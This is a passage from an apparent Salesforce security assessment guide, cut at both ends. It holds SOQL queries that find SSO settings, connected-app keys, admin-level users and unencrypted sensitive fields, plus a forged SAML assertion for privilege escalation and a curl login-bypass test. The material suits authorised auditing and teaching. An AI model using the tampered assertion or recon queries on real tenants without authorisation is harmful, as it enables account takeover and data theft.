</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">       </span><span class="n">IdentityMapping</span><span class="p">,</span><span class="w"> </span><span class="n">AttributeFormat</span><span class="p">,</span><span class="w"> </span><span class="n">OptionsSpInitBinding</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="k">FROM</span><span class="w"> </span><span class="n">SamlSsoConfig</span>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="c1">-- Connected apps with SSO</span>
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">CallbackUrl</span><span class="p">,</span><span class="w"> </span><span class="n">ConsumerKey</span><span class="p">,</span><span class="w"> </span><span class="n">UsePkce</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="w">       </span><span class="n">OptionsFullScopeApprovals</span><span class="p">,</span><span class="w"> </span><span class="n">OptionsRefreshTokenValidityMetric</span>
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ConnectedApplication</span><span class="w"> </span>
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">CallbackUrl</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%saml%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">CallbackUrl</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%sso%&#39;</span>
</span></code></pre></div></p>
<p><strong>SAML Response Manipulation</strong>:
<div class="language-xml highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="cm">&lt;!-- Test SAML assertion tampering --&gt;</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nt">&lt;saml:Assertion</span><span class="w"> </span><span class="na">xmlns:saml=</span><span class="s">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">    </span><span class="nt">&lt;saml:Subject&gt;</span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">        </span><span class="nt">&lt;saml:NameID</span><span class="w"> </span><span class="na">Format=</span><span class="s">&quot;urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">            </span>admin@target.com<span class="w"> </span><span class="cm">&lt;!-- Privilege escalation attempt --&gt;</span>
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="w">        </span><span class="nt">&lt;/saml:NameID&gt;</span>
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="w">    </span><span class="nt">&lt;/saml:Subject&gt;</span>
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="w">    </span><span class="nt">&lt;saml:AttributeStatement&gt;</span>
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="w">        </span><span class="nt">&lt;saml:Attribute</span><span class="w"> </span><span class="na">Name=</span><span class="s">&quot;Profile&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="w">            </span><span class="nt">&lt;saml:AttributeValue&gt;</span>System<span class="w"> </span>Administrator<span class="nt">&lt;/saml:AttributeValue&gt;</span>
</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="w">        </span><span class="nt">&lt;/saml:Attribute&gt;</span>
</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="w">    </span><span class="nt">&lt;/saml:AttributeStatement&gt;</span>
</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="nt">&lt;/saml:Assertion&gt;</span>
</span></code></pre></div></p>
<p><strong>SSO Bypass Testing</strong>:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Test direct login bypass</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://instance.salesforce.com/login.jsp<span class="w"> </span><span class="se">\</span>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;username=user@domain.com&amp;pw=password&quot;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: SSO vulnerabilities can lead to authentication bypass and privilege escalation.</p>
<hr />
<h2 id="authorization-access-control-testing">Authorization &amp; Access Control Testing</h2>
<h3 id="1-profile-permission-analysis">1. Profile &amp; Permission Analysis</h3>
<p><strong>Objective</strong>: Identify privilege escalation opportunities and excessive permissions.</p>
<p><strong>High-Privilege Discovery</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1">-- System administrators and equivalent users</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="n">Email</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">UserRole</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">       </span><span class="n">IsActive</span><span class="p">,</span><span class="w"> </span><span class="n">LastLoginDate</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span><span class="p">,</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">       </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsModifyAllData</span><span class="p">,</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsViewAllData</span><span class="p">,</span>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">       </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsManageUsers</span><span class="p">,</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsCustomizeApplication</span>
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="k">FROM</span><span class="w"> </span><span class="k">User</span><span class="w"> </span>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsModifyAllData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span>
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsViewAllData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span>
</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsManageUsers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span>
</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsCustomizeApplication</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span>
</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">LastLoginDate</span><span class="w"> </span><span class="k">DESC</span><span class="w"> </span><span class="n">NULLS</span><span class="w"> </span><span class="k">LAST</span>
</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>
</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="c1">-- Dangerous permission combinations</span>
</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span>
</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="w">       </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsModifyAllData</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ModifyAll</span><span class="p">,</span>
</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="w">       </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsViewAllData</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ViewAll</span><span class="p">,</span>
</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="w">       </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsManageUsers</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ManageUsers</span><span class="p">,</span>
</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a><span class="w">       </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsCustomizeApplication</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">CustomizeApp</span><span class="p">,</span>
</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a><span class="w">       </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsApiEnabled</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ApiEnabled</span>
</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a><span class="k">FROM</span><span class="w"> </span><span class="k">User</span><span class="w"> </span>
</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsModifyAllData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span>
</span><span id="__span-14-22"><a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a><span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="p">(</span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsViewAllData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsManageUsers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="p">)</span>
</span><span id="__span-14-23"><a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a><span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsCustomizeApplication</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span>
</span><span id="__span-14-24"><a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>
</span><span id="__span-14-25"><a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a><span class="c1">-- Recently elevated users</span>
</span><span id="__span-14-26"><a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="n">Email</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span><span class="p">,</span>
</span><span id="__span-14-27"><a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a><span class="w">       </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">()</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">PermissionSetAssignment</span><span class="w"> </span>
</span><span id="__span-14-28"><a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a><span class="w">        </span><span class="k">WHERE</span><span class="w"> </span><span class="n">AssigneeId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">User</span><span class="p">.</span><span class="n">Id</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">CreatedDate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LAST_N_DAYS</span><span class="p">:</span><span class="mi">30</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">Recent_PermSets</span>
</span><span id="__span-14-29"><a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a><span class="k">FROM</span><span class="w"> </span><span class="k">User</span><span class="w"> </span>
</span><span id="__span-14-30"><a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Admin%&#39;</span><span class="w"> </span>
</span><span id="__span-14-31"><a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a><span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">CreatedDate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LAST_N_DAYS</span><span class="p">:</span><span class="mi">90</span>
</span></code></pre></div></p>
<p><strong>Permission Set Analysis</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1">-- High-risk permission sets</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span><span class="k">Type</span><span class="p">,</span><span class="w"> </span><span class="n">IsOwnedByProfile</span><span class="p">,</span>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">       </span><span class="n">PermissionsModifyAllData</span><span class="p">,</span><span class="w"> </span><span class="n">PermissionsViewAllData</span><span class="p">,</span>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">       </span><span class="n">PermissionsManageUsers</span><span class="p">,</span><span class="w"> </span><span class="n">PermissionsCustomizeApplication</span><span class="p">,</span>
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="w">       </span><span class="n">PermissionsApiEnabled</span><span class="p">,</span>
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="w">       </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">()</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">PermissionSetAssignment</span><span class="w"> </span>
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="w">        </span><span class="k">WHERE</span><span class="w"> </span><span class="n">PermissionSetId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PermissionSet</span><span class="p">.</span><span class="n">Id</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">AssigneeCount</span>
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="k">FROM</span><span class="w"> </span><span class="n">PermissionSet</span><span class="w"> </span>
</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">PermissionsModifyAllData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span>
</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="n">PermissionsViewAllData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span>
</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="n">PermissionsManageUsers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span>
</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="n">PermissionsCustomizeApplication</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span>
</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">AssigneeCount</span><span class="w"> </span><span class="k">DESC</span>
</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>
</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="c1">-- Permission set assignments with potential issues</span>
</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">PermissionSet</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">PermissionSet</span><span class="p">.</span><span class="n">PermissionsModifyAllData</span><span class="p">,</span>
</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="w">       </span><span class="n">Assignee</span><span class="p">.</span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="n">Assignee</span><span class="p">.</span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">AssignmentId</span><span class="p">,</span>
</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="w">       </span><span class="n">ExpirationDate</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedBy</span><span class="p">.</span><span class="n">Name</span>
</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="k">FROM</span><span class="w"> </span><span class="n">PermissionSetAssignment</span><span class="w"> </span>
</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">ExpirationDate</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">null</span><span class="w"> </span>
</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="p">(</span><span class="n">PermissionSet</span><span class="p">.</span><span class="n">PermissionsModifyAllData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">ExpirationDate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">null</span><span class="p">)</span>
</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">CreatedDate</span><span class="w"> </span><span class="k">DESC</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Over-privileged users can lead to complete tenant compromise.</p>
<h3 id="2-field-level-security-assessment">2. Field-Level Security Assessment</h3>
<p><strong>Objective</strong>: Identify sensitive data exposure through inadequate field-level security.</p>
<p><strong>Sensitive Field Discovery</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1">-- Potentially sensitive fields identification</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">EntityDefinition</span><span class="p">.</span><span class="n">QualifiedApiName</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ObjectName</span><span class="p">,</span>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="w">       </span><span class="n">QualifiedApiName</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">FieldName</span><span class="p">,</span><span class="w"> </span><span class="n">Label</span><span class="p">,</span><span class="w"> </span><span class="n">DataType</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="w">       </span><span class="n">IsEncrypted</span><span class="p">,</span><span class="w"> </span><span class="n">SecurityClassification</span><span class="p">,</span><span class="w"> </span><span class="n">ComplianceGroup</span><span class="p">,</span>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="w">       </span><span class="n">Description</span>
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="k">FROM</span><span class="w"> </span><span class="n">FieldDefinition</span><span class="w"> </span>
</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="k">WHERE</span><span class="w"> </span><span class="p">(</span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%SSN%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Social Security%&#39;</span><span class="w"> </span>
</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Tax%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%EIN%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%TIN%&#39;</span>
</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Credit Card%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Bank%&#39;</span><span class="w"> </span>
</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Account Number%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Routing%&#39;</span>
</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Password%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Secret%&#39;</span><span class="w"> </span>
</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Key%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Token%&#39;</span>
</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Salary%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Income%&#39;</span>
</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%DOB%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Label</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%Birth%&#39;</span><span class="p">)</span>
</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a><span class="w">   </span><span class="k">AND</span><span class="w"> </span><span class="n">IsEncrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">false</span>
</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">EntityDefinition</span><span class="p">.</span><span class="n">QualifiedApiName</span><span class="p">,</span><span class="w"> </span><span class="n">SecurityClassification</span><span class="w"> </span><span class="k">DESC</span>
</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a>
</span><span id="__span-16-18"><a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a><span class="c1">-- Field accessibility by profile</span>
</span><span id="__span-16-19"><a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Field</span><span class="p">,</span><span class="w"> </span><span class="n">Parent</span><span class="p">.</span><span class="n">Name</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ProfileName</span><span class="p">,</span><span class="w"> </span>
